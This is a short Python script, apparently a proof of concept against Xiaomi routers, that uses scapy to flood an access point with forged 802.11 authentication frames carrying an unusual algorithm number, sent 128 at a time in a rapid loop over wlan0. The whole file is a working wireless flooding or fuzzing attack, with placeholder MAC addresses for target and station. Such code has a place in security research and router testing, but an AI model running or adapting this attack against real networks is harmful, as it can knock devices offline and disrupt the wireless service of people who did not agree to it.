#!/usr/bin/env python
#Xiaomi
import sys
from scapy.all import *

#authentication
#algo 1 to 65535
def auth_frame():
    mac1 = 'STA MAC' #STA MAC
    mac2 = 'AP MAC' #AP MAC
    return RadioTap()\
      /Dot11(type=0, subtype=11,  addr1=mac2, addr2=mac1, addr3=mac2)/Dot11Auth(algo=7, seqnum=1, status=0)


def construct():
    Auth = auth_frame()
    return Auth

#loop should be 50 to 100
for n in range(int(100)):
	sendp(construct(), inter=0.0001, count=128, iface="wlan0")
	print ("\nAuth Packet sent: " +str(n))
